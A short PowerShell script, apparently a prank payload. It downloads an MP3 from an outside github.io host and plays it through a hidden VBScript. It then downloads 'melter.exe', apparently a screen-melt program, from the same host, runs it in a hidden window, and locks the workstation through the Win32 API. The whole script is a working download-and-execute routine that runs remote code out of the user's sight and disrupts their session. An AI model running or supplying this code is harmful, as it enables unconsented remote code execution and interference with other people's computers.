$base = "https://nikowoo.github.io/MUSIC"
$tmp = "$env:TEMP\__snd.mp3"
(New-Object System.Net.WebClient).DownloadFile("$base/gecs.mp3", $tmp)

$vbs = "$env:TEMP\__play.vbs"
@"
Dim mp
Set mp = CreateObject("WMPlayer.OCX")
mp.URL = "$tmp"
mp.controls.play
Do While mp.playState <> 1
    WScript.Sleep 500
Loop
WScript.Sleep 1000
"@ | Set-Content $vbs -Encoding ASCII

Start-Process cscript.exe -ArgumentList "//Nologo //B `"$vbs`"" -WindowStyle Hidden

# run screen melt
$melter = "$env:TEMP\melter.exe"
(New-Object System.Net.WebClient).DownloadFile("$base/melter.exe", $melter)
Start-Process $melter -ArgumentList "-T -I -e 5000" -WindowStyle Hidden
$signature = @'
[DllImport("user32.dll", SetLastError = true)]
public static extern bool LockWorkStation();
'@
$type = Add-Type -MemberDefinition $signature -Name "Win32LockWorkStation" -Namespace Win32Functions -PassThru
$type::LockWorkStation()
